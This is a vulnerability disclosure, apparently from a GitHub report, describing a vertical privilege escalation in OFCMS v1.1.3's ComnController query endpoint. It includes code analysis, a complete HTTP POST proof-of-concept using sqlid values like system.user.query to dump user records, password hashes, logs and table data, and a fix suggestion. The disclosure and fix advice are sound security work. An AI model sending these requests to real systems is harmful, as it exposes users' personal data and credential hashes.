## Vulnerability Description

The `ComnController` component in OFCMS v1.1.3 contains a security flaw when handling general query requests. Its `query()` method fails to strictly validate the caller's permissions, allowing low-privilege users to access interfaces intended for administrator use. A remote attacker can bypass access controls by sending a POST request to `/admin/comn/service/query.json` using a specific `sqlid` parameter (such as `system.user.query`), obtaining detailed sensitive information about all users within the system, including but not limited to usernames, phone numbers, email addresses, and salted password hashes. Different `sqlid` values ​​can be used to obtain different sensitive system information.

## Vulnerability Analysis


System access control file: \ofcms-admin\src\main\resources\dev\shiro.ini


Accessing the /admin/** path is possible as long as you are logged into the system. Therefore, even users with lower privileges can access this path.


<img width="1763" height="592" alt="Pasted image 20260508110250" src="https://github.com/user-attachments/assets/07c92516-5842-4f98-b322-eeee38d9cf78" />


The vulnerability's entry point class file is: \ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\ComnController.java


Lines 31 to 37 show that there is no user permission check. Any user with low privileges who logs into the system can call the query() method using the /admin/comn/service/query.json interface.

The `sqlid` parameter on line 33 is controllable. By setting the `sqlid` value to `system.user.query`, `system.log.query`, `system.generate.query`, etc., we can obtain a large amount of sensitive system information. Therefore, this is a vertical privilege escalation vulnerability.


<img width="1440" height="797" alt="Pasted image 20260508110039" src="https://github.com/user-attachments/assets/c70cb323-b278-453e-9b01-c2bf63513a5c" />


sql file:\ofcms-admin\src\main\resources\conf\sql\system\user.sql

When sqlid is system.user.query, the following SQL request will be made:


<img width="1766" height="817" alt="Pasted image 20260508110840" src="https://github.com/user-attachments/assets/7a3af153-6f9b-4b7b-a2c0-8a7bfab9e20e" />



## Vulnerability Reproduction

Log in as a user with low privileges

<img width="1920" height="966" alt="Pasted image 20260508110919" src="https://github.com/user-attachments/assets/8fd2140e-a540-41af-b161-f1f7cafe4ff3" />



Using the user's cookie, construct the following request:

```http
POST /ofcms_admin/admin/comn/service/query.json HTTP/1.1
Host: localhost:8080
Content-Length: 58
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/ofcms_admin/admin/f.html?p=system/user/edit.html&topMode=readonly&user_id=4
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=36800E2BBF9641285ED4F76177F244FC
Connection: keep-alive

sqlid=system.user.query&pageNum=1&pageSize=10&field=&sort=

```

The response is as follows: Detailed personal information of all users in the system is directly obtained.


<img width="1909" height="866" alt="Pasted image 20260508111153" src="https://github.com/user-attachments/assets/855baffd-9061-4588-9b6c-438a2b5ad36f" />



Alternatively, you can set `sqlid=system.log.query&pageNum=1&pageSize=10&field=&sort=` to retrieve system user log information.

<img width="1916" height="899" alt="Pasted image 20260508111325" src="https://github.com/user-attachments/assets/180eea24-ee5f-44bc-8bd5-7b7a92ea2ed8" />


Setting `sqlid` to: `sqlid=system.generate.query&pageNum=1&pageSize=10&field=&sort=`

Allows access to system table information in the database. There are many more `sqlid` values ​​that can be iterated over, but I won't demonstrate them here. The vulnerability reproduction is complete.



<img width="1910" height="877" alt="Pasted image 20260508111427" src="https://github.com/user-attachments/assets/c83a1a49-5f98-477b-bda4-1f49c2b02607" />



## Repair suggestions


It is recommended to add role-based access control (RBAC) checks before executing the query method in ComnController, or to enforce administrator privilege verification for sensitive operations under /admin/comn/service/ at the interceptor level.
